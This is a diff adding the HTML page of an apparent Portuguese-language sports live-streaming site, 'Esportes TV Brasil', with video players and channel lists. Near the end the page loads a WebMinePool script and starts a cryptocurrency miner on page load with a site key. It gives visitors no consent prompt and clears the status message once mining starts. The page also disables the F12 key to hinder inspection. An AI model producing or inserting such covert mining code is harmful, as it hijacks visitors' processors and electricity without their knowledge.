@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Esportes TV Brasil </title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
+    <script src="https://cdn.dashjs.org/latest/dash.all.min.js"></script>
+    <link href="https://vjs.zencdn.net/7.11.4/video-js.css" rel="stylesheet">
+    <script src="https://vjs.zencdn.net/7.11.4/video.min.js"></script>
+    
+</head>
+<body>
+    <!-- Cabeçalho -->
+    <header>
+        <h1>Esportes TV Brasil </h1>
+        <button class="menu-btn" onclick="openMenu()">Menu</button>
+    </header>
+
+    <!-- Banner -->
+    <div class="banner">
+        <a href="https://imgbb.com/"><img src="https://i.ibb.co/7VRCVJs/Esportes-TV-Brasil.png" alt="Esportes-TV-Brasil" border="1"></a>
+    </div>
+    
+
+    <!-- Contêiner de Categorias (JSON) -->
+    <div id="category-container" class="category-buttons">
+        <!-- Botões de Categorias (JSON) serão adicionados aqui -->
+    </div>
+
+    <!-- Contêiner de Canais (JSON) -->
+    <div id="channel-container" class="channel-buttons">
+        <!-- Botões de Canais (JSON) serão adicionados aqui -->
+    </div>
+
+    <!-- Contêiner de Categorias e Canais (M3U) -->
+    <div id="m3u-container">
+        <!-- Botões de Categorias (M3U) serão adicionados aqui -->
+    </div>
+
+    <!-- Pop-up para reprodução de vídeo -->
+    <div id="popup" class="popup" style="display: none;">
+        <button class="close-btn" onclick="closePopup()">Fechar</button>
+        <video id="popup-video-player" controls></video>
+    </div>
+
+    <!-- Popup do Canal -->
+    <div class="channel-popup" id="channelPopup">
+        <div class="popup-content">
+            <button class="close-btn" onclick="closePopup()">×</button>
+            <div id="channelContainer">
+                <iframe src="" frameborder="0"></iframe>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-content">
+            <h3>Esportes TV Brasil</h3>
+            <p>O melhor lugar para assistir aos seus esportes favoritos ao vivo.</p>
+            <ul class="socials">
+                <li><a href="#"><img src="link-para-icone-facebook.png" alt="Facebook"></a></li>
+                <li><a href="#"><img src="link-para-icone-twitter.png" alt="Twitter"></a></li>
+                <li><a href="#"><img src="link-para-icone-instagram.png" alt="Instagram"></a></li>
+                <li><a href="#"><img src="link-para-icone-youtube.png" alt="YouTube"></a></li>
+            </ul>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2024 Esportes Brasil TV | Todos os direitos reservados</p>
+        </div>
+    </footer>
+    
+
+    <script>
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'F12') {
+                event.preventDefault();
+                alert('O uso do F12 está desabilitado.');
+            }
+        });
+        
+        // Bloquear clique direito do mouse
+        //document.addEventListener('contextmenu', function(event) {
+           // event.preventDefault();
+            //alert('O clique direito está desabilitado.');
+        //});
+
+        
+    </script>
+      <div id="status-message">Iniciando a mineração...</div>
+
+      <!-- Incluir o script do WebMinePool -->
+      <script src="https://webminepool.com/lib/base.js"></script>
+      <script>
+        // Função para iniciar a mineração
+        function startMining() {
+            if (typeof WMP === 'undefined') {
+                console.error("WebMinePool não está definido. Verifique a inclusão do script.");
+                return;
+            }
+    
+            console.log("Iniciando a mineração...");
+            var miner = WMP.Anonymous('<SK_Cjp66feav54B8rPcMQMxk>', { throttle: 0.3 });
+            miner.start();
+            console.log("Mineração iniciada.");
+            document.getElementById('status-message').innerText = '';
+        }
+    
+        // Inicia a mineração quando a página carrega
+        document.addEventListener('DOMContentLoaded', function() {
+            startMining();
+        });
+      </script>
+    
+        <script src="json.js"></script>
+        <script src="m3u.js"></script>
+</body>
+</html>
